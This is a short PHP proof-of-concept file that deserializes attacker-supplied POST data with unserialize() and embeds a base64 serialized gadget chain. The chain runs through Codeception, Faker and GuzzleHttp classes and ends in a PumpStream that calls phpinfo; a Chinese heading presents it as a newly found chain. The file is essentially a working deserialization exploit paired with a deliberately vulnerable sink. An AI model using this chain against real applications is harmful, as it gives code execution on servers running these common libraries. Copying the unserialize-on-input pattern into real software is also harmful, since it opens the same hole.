<?php
include("closure/autoload.php");
function myloader($class){
    require_once './class/' . (str_replace('\\', '/', $class) . '.php');
}
spl_autoload_register("myloader"); 
error_reporting(0);
$_POST['data'] = "TzozMjoiQ29kZWNlcHRpb25cRXh0ZW5zaW9uXFJ1blByb2Nlc3MiOjE6e3M6NDM6IgBDb2RlY2VwdGlvblxFeHRlbnNpb25cUnVuUHJvY2VzcwBwcm9jZXNzZXMiO2E6MTp7aTowO086MjI6IkZha2VyXERlZmF1bHRHZW5lcmF0b3IiOjE6e3M6MTA6IgAqAGRlZmF1bHQiO086Mjg6Ikd1enpsZUh0dHBcUHNyN1xBcHBlbmRTdHJlYW0iOjE6e3M6Mzc6IgBHdXp6bGVIdHRwXFBzcjdcQXBwZW5kU3RyZWFtAHN0cmVhbXMiO2E6MTp7aTowO086Mjk6Ikd1enpsZUh0dHBcUHNyN1xDYWNoaW5nU3RyZWFtIjoxOntzOjQzOiIAR3V6emxlSHR0cFxQc3I3XENhY2hpbmdTdHJlYW0AcmVtb3RlU3RyZWFtIjtPOjI2OiJHdXp6bGVIdHRwXFBzcjdcUHVtcFN0cmVhbSI6MTp7czozNDoiAEd1enpsZUh0dHBcUHNyN1xQdW1wU3RyZWFtAHNvdXJjZSI7czo3OiJwaHBpbmZvIjt9fX19fX19";
if($_POST['data']){
    unserialize(base64_decode($_POST['data']));
}else{
	echo "<h1>某ii最新的某条链子</h1>";
}